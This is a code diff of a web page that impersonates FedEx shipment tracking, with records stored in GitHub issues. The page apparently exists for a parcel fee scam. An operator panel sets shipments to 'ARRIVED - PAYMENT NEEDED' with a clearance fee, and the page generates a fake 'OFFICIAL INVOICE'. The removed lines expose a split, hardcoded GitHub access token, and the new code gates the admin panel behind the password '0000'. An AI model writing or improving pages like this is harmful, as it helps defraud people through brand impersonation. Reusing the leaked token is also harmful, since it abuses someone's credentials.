@@ -20,7 +20,7 @@
 </head>
 <body>
 
-<div class="nav" onclick="checkPass()">Fed<span class="orange">ex</span> Logistics</div>
+<div class="nav" onclick="loginAdmin()">Fed<span class="orange">ex</span> Logistics</div>
 
 <div class="card">
     <h3 style="color: #4D148C; margin-bottom: 15px;">Track Shipment</h3>
@@ -34,7 +34,6 @@
             <span>🏁 <b>Estimated:</b><br><span id="vTimeTo"></span></span>
         </div>
         <p style="margin:10px 0;"><strong>Status:</strong> <span id="vStatus" class="status-txt"></span></p>
-        
         <div id="vFeeBox" class="fee-alert">
             <span style="font-size: 14px;">TOTAL CLEARANCE FEE:</span><br>
             <span id="vFee" style="font-size: 24px; font-weight: 900;"></span>
@@ -51,7 +50,6 @@
     <input type="text" id="nTo" placeholder="To City/Country">
     <input type="text" id="nTimeFrom" placeholder="Departure (e.g. 10:00 AM)">
     <input type="text" id="nTimeTo" placeholder="Arrival (e.g. 05:00 PM)">
-    
     <span class="label">FINANCIALS</span>
     <input type="text" id="nFee" placeholder="Fee (e.g. $600)">
     <select id="nStatus">
@@ -63,17 +61,23 @@
 </div>
 
 <script>
-    // Hidden split token
-    const p1 = "Ghp_4m5gCgb6";
-    const p2 = "7N0kA63B6u2rbiPV";
-    const p3 = "CYfBmU0AUmG3";
-    const KEY = p1 + p2 + p3;
-    
+    let SESSION_KEY = ""; // This stays empty in the code
     const USER = "FedEx76"; 
     const REPO = "FedEx-tracking-"; 
 
     let currentData = null;
     let currentId = "";
+
+    function loginAdmin() {
+        const pass = prompt("Enter Admin Password:");
+        if(pass === "0000") {
+            SESSION_KEY = prompt("Paste your GitHub Token here:");
+            if(SESSION_KEY) {
+                document.getElementById('adminBox').style.display = 'block';
+                window.scrollTo(0, document.body.scrollHeight);
+            }
+        }
+    }
 
     async function track() {
         const id = document.getElementById('trackInput').value.trim().toUpperCase();
@@ -91,22 +95,19 @@
                 document.getElementById('vTimeTo').innerText = currentData.timeTo || "TBD";
                 document.getElementById('vStatus').innerText = currentData.status;
 
-                // Trigger payment box only for Arrived status
                 if(currentData.status === "ARRIVED - PAYMENT NEEDED") {
                     document.getElementById('vFeeBox').style.display = 'block';
                     document.getElementById('vFee').innerText = currentData.fee;
-                } else { 
-                    document.getElementById('vFeeBox').style.display = 'none'; 
-                }
+                } else { document.getElementById('vFeeBox').style.display = 'none'; }
             } else { alert("Tracking ID not found."); }
         } catch(e) { alert("Error connecting."); }
     }
 
     async function saveData() {
         const id = document.getElementById('nId').value.trim().toUpperCase();
-        if(!id) return alert("Enter ID!");
+        if(!id || !SESSION_KEY) return alert("Missing ID or Token!");
         const btn = document.getElementById('saveBtn');
-        btn.innerText = "UPDATING...";
+        btn.innerText = "SAVING...";
         const packet = {
             from: document.getElementById('nFrom').value,
             to: document.getElementById('nTo').value,
@@ -118,51 +119,22 @@
         try {
             const response = await fetch(`https://api.github.com/repos/${USER}/${REPO}/issues`, {
                 method: 'POST',
-                headers: { 'Authorization': `token ${KEY}`, 'Content-Type': 'application/json' },
+                headers: { 'Authorization': `token ${SESSION_KEY}`, 'Content-Type': 'application/json' },
                 body: JSON.stringify({ title: `ID: ${id}`, body: JSON.stringify(packet), labels: [id] })
             });
-            if(response.ok) { 
-                alert("Saved Successfully!"); 
-                document.getElementById('adminBox').style.display='none'; 
-            } else { 
-                const err = await response.json();
-                alert("GitHub Error: " + err.message); 
-            }
+            if(response.ok) { alert("Saved Successfully!"); document.getElementById('adminBox').style.display='none'; }
+            else { alert("GitHub rejected the token. Please use a fresh one."); }
         } catch(e) { alert("Error saving."); }
         finally { btn.innerText="SAVE CHANGES"; }
     }
 
     function generateReceipt() {
-        const receipt = `
---------------------------------
-      Fedex Global Express
-        OFFICIAL INVOICE
---------------------------------
-Ref: INV-${currentId}
-Date: ${new Date().toLocaleDateString()}
---------------------------------
-TRACKING ID : ${currentId}
-FROM        : ${currentData.from}
-TO          : ${currentData.to}
-DEPARTED    : ${currentData.timeFrom}
-ARRIVED     : ${currentData.timeTo}
---------------------------------
-TOTAL DUE   : ${currentData.fee}
---------------------------------
-STATUS      : PENDING CLEARANCE
---------------------------------`;
+        const receipt = `--------------------------------\nFedex Global Express\nOFFICIAL INVOICE\n--------------------------------\nID: ${currentId}\nFROM: ${currentData.from}\nTO: ${currentData.to}\nTOTAL DUE: ${currentData.fee}\n--------------------------------`;
         const blob = new Blob([receipt], { type: 'text/plain' });
         const link = document.createElement('a');
         link.href = URL.createObjectURL(blob);
-        link.download = `Fedex_Invoice_${currentId}.txt`;
+        link.download = `Invoice_${currentId}.txt`;
         link.click();
-    }
-
-    function checkPass() {
-        if(prompt("Admin Password:") === "0000") {
-            document.getElementById('adminBox').style.display = 'block';
-            window.scrollTo(0, document.body.scrollHeight);
-        }
     }
 </script>
 </body>
